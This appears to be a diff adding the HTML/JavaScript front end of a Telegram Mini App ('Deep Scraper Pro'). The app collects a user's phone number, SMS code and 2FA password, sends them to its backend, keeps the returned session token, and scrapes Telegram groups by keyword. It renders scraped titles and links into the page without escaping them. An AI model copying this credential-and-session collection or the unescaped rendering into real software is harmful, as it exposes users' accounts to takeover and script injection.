@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Deep Scraper Pro</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        :root {
+            --primary: #0088cc;
+            --accent: #00d2ff;
+            --glass: rgba(255, 255, 255, 0.1);
+            --glass-border: rgba(255, 255, 255, 0.2);
+            --text: #ffffff;
+            --error: #ff3b30;
+        }
+
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+
+        body {
+            font-family: 'SF Pro Display', -apple-system, sans-serif;
+            margin: 0; padding: 20px; color: var(--text); min-height: 100vh;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            background-size: 400% 400%;
+            animation: gradientBG 15s ease infinite;
+        }
+
+        @keyframes gradientBG { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
+
+        .app-wrapper { width: 100%; max-width: 480px; margin: 0 auto; padding-bottom: 50px; }
+
+        /* Glass Panels */
+        .glass-panel {
+            background: var(--glass);
+            backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
+            border: 1px solid var(--glass-border); border-radius: 24px;
+            padding: 24px; box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.4);
+            margin-bottom: 20px; position: relative;
+        }
+
+        /* Floating Logout Button */
+        .mini-logout {
+            position: absolute; top: 15px; right: 15px;
+            width: 38px !important; height: 38px !important; padding: 0 !important;
+            border-radius: 12px !important; background: rgba(255, 255, 255, 0.05) !important;
+            border: 1px solid var(--glass-border) !important; font-size: 18px !important;
+            display: flex; align-items: center; justify-content: center; z-index: 100;
+        }
+
+        h1 { font-size: 28px; font-weight: 800; margin: 0; text-align: center; }
+        .subtitle { font-size: 14px; opacity: 0.6; margin-bottom: 30px; text-align: center; }
+
+        input {
+            width: 100%; padding: 16px; margin-bottom: 12px; border-radius: 14px;
+            border: 1px solid var(--glass-border); background: rgba(255, 255, 255, 0.05);
+            color: white; font-size: 16px; outline: none; transition: 0.3s;
+        }
+        input:focus { border-color: var(--accent); background: rgba(255, 255, 255, 0.1); }
+        input.error { border-color: var(--error) !important; animation: shake 0.3s; }
+
+        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
+
+        /* Global Button States */
+        button {
+            width: 100%; padding: 16px; border-radius: 14px; border: none;
+            background: linear-gradient(90deg, var(--primary), var(--accent));
+            color: white; font-weight: 700; font-size: 16px; cursor: pointer;
+            transition: 0.2s cubic-bezier(0.4, 0, 0.2, 1); position: relative;
+        }
+        button:active { transform: scale(0.97); }
+        button.loading { color: transparent !important; pointer-events: none; }
+        button.loading::after {
+            content: ""; position: absolute; width: 20px; height: 20px; top: 50%; left: 50%;
+            margin: -10px 0 0 -10px; border: 3px solid rgba(255, 255, 255, 0.3);
+            border-top-color: #fff; border-radius: 50%; animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .action-bar { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; margin-top: 15px; }
+        .small-btn { padding: 12px; font-size: 12px; background: rgba(255, 255, 255, 0.1); }
+        .wipe-btn { background: rgba(255, 59, 48, 0.2); color: #ff6b6b; border: 1px solid rgba(255, 59, 48, 0.1); }
+
+        .result-card {
+            background: rgba(255, 255, 255, 0.07); border-radius: 20px; padding: 16px;
+            margin-bottom: 12px; display: flex; justify-content: space-between; align-items: center;
+            border: 1px solid rgba(255, 255, 255, 0.05); animation: fadeIn 0.4s ease forwards;
+        }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        .members-tag { background: rgba(0, 210, 255, 0.2); color: var(--accent); padding: 2px 8px; border-radius: 6px; font-weight: 700; font-size: 11px; }
+        .hidden { display: none !important; }
+    </style>
+</head>
+<body>
+    <div class="app-wrapper">
+        <div style="margin-top: 20px;">
+            <h1>DeepScraper<span style="color:var(--accent)">.</span></h1>
+            <p class="subtitle">Next-Gen Intelligence</p>
+        </div>
+
+        <div id="auth-ui" class="glass-panel">
+            <div id="phone-box">
+                <input type="tel" id="phone" placeholder="+254 700 000000">
+                <button id="btn-send" onclick="sendCode()">Request Secure Access</button>
+            </div>
+            <div id="verify-box" class="hidden">
+                <input type="text" id="code" placeholder="SMS Code">
+                <input type="password" id="pwd" placeholder="2FA Password (if set)">
+                <button id="btn-verify" onclick="verify()">Complete Login</button>
+            </div>
+        </div>
+
+        <div id="main-ui" class="hidden">
+            <div class="glass-panel">
+                <button class="mini-logout" onclick="logout()" title="Logout">🚪</button>
+                <div style="margin-bottom: 15px; font-weight: bold; font-size: 14px; opacity: 0.8;">SCANNER CORE</div>
+                <input type="text" id="keys" placeholder="Keywords (comma separated)">
+                <button id="btn-scrape" onclick="startScrape()">⚡ Start Deep Crawl</button>
+                
+                <div id="dashboard-controls" class="hidden">
+                    <div class="action-bar">
+                        <button class="small-btn" onclick="sortData()">📊 Sort</button>
+                        <button class="small-btn" onclick="exportCSV()">📥 Export</button>
+                        <button class="small-btn wipe-btn" onclick="wipeData()">🗑️ Wipe</button>
+                    </div>
+                </div>
+            </div>
+
+            <div id="filter-container" class="hidden">
+                <input type="text" id="filter-input" placeholder="🔍 Filter results..." oninput="filterList()">
+                <div id="stats" style="padding: 0 10px 10px 10px; font-size: 12px; opacity: 0.7; font-weight: bold;"></div>
+            </div>
+            
+            <div id="list"></div>
+        </div>
+    </div>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+        let currentData = [];
+
+        window.onload = () => {
+            if (localStorage.getItem('tg_session')) {
+                showMain();
+                const saved = localStorage.getItem('last_scrape_results');
+                if (saved) {
+                    currentData = JSON.parse(saved);
+                    renderList(currentData);
+                    document.getElementById('dashboard-controls').classList.remove('hidden');
+                    document.getElementById('filter-container').classList.remove('hidden');
+                }
+            }
+        };
+
+        function showMain() {
+            document.getElementById('auth-ui').classList.add('hidden');
+            document.getElementById('main-ui').classList.remove('hidden');
+        }
+
+        function setBtnLoading(id, isLoading) {
+            const btn = document.getElementById(id);
+            if(isLoading) btn.classList.add('loading');
+            else btn.classList.remove('loading');
+            btn.disabled = isLoading;
+        }
+
+        async function sendCode() {
+            const phone = document.getElementById('phone');
+            if(!phone.value) return phone.classList.add('error');
+            setBtnLoading('btn-send', true);
+            try {
+                const res = await fetch('/api/send-code', { 
+                    method: 'POST', 
+                    headers: {'Content-Type': 'application/json'}, 
+                    body: JSON.stringify({ phone: phone.value }) 
+                });
+                if(res.ok) {
+                    document.getElementById('phone-box').classList.add('hidden');
+                    document.getElementById('verify-box').classList.remove('hidden');
+                    tg.HapticFeedback.notificationOccurred('success');
+                }
+            } finally { setBtnLoading('btn-send', false); }
+        }
+
+        async function verify() {
+            const code = document.getElementById('code');
+            if(!code.value) return code.classList.add('error');
+            setBtnLoading('btn-verify', true);
+            try {
+                const res = await fetch('/api/verify', { 
+                    method: 'POST', 
+                    headers: {'Content-Type': 'application/json'}, 
+                    body: JSON.stringify({ phone: document.getElementById('phone').value, code: code.value, password: document.getElementById('pwd').value }) 
+                });
+                const data = await res.json();
+                if (data.success) {
+                    localStorage.setItem('tg_session', data.session);
+                    location.reload();
+                } else { tg.showAlert("Login Failed"); }
+            } finally { setBtnLoading('btn-verify', false); }
+        }
+
+        async function startScrape() {
+            const keys = document.getElementById('keys');
+            if(!keys.value) return keys.classList.add('error');
+            setBtnLoading('btn-scrape', true);
+            try {
+                const res = await fetch('/api/scrape', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ session: localStorage.getItem('tg_session'), keywords: keys.value.split(',') })
+                });
+                currentData = await res.json();
+                localStorage.setItem('last_scrape_results', JSON.stringify(currentData));
+                renderList(currentData);
+                document.getElementById('dashboard-controls').classList.remove('hidden');
+                document.getElementById('filter-container').classList.remove('hidden');
+                tg.HapticFeedback.notificationOccurred('success');
+            } finally { setBtnLoading('btn-scrape', false); }
+        }
+
+        function renderList(data) {
+            document.getElementById('stats').innerText = `FOUND: ${data.length}`;
+            document.getElementById('list').innerHTML = data.map(i => `
+                <div class="result-card">
+                    <div style="flex:1">
+                        <span style="font-weight:700; font-size:14px; display:block;">${i.title}</span>
+                        <div style="display:flex; gap:8px; align-items:center; margin-top:4px;">
+                            <span class="members-tag">${Number(i.members).toLocaleString()}</span>
+                            <span style="font-size:10px; opacity:0.6;">${i.type}</span>
+                        </div>
+                    </div>
+                    <button style="width:auto; padding:8px 16px; font-size:12px;" onclick="window.open('${i.link}')">OPEN</button>
+                </div>
+            `).join('');
+        }
+
+        function filterList() {
+            const query = document.getElementById('filter-input').value.toLowerCase();
+            renderList(currentData.filter(i => i.title.toLowerCase().includes(query)));
+        }
+
+        function wipeData() {
+            const clear = () => {
+                currentData = [];
+                localStorage.removeItem('last_scrape_results');
+                renderList([]);
+                document.getElementById('dashboard-controls').classList.add('hidden');
+                document.getElementById('filter-container').classList.add('hidden');
+            };
+            if (tg.isVersionAtLeast('6.2')) tg.showConfirm("Wipe all results?", (ok) => { if(ok) clear(); });
+            else if (confirm("Wipe results?")) clear();
+        }
+
+        function logout() {
+            const doLogout = () => { localStorage.clear(); location.reload(); };
+            if (tg.isVersionAtLeast('6.2')) tg.showConfirm("Logout of session?", (ok) => { if(ok) doLogout(); });
+            else if (confirm("Logout?")) doLogout();
+        }
+
+        function sortData() {
+            currentData.sort((a,b) => b.members - a.members);
+            renderList(currentData);
+        }
+
+        function exportCSV() {
+            let csv = "Title,Link,Members\n";
+            currentData.forEach(r => csv += `"${r.title}","${r.link}","${r.members}"\n`);
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(new Blob([csv], { type: 'text/csv' }));
+            a.download = 'results.csv'; a.click();
+        }
+    </script>
+</body>
+</html>
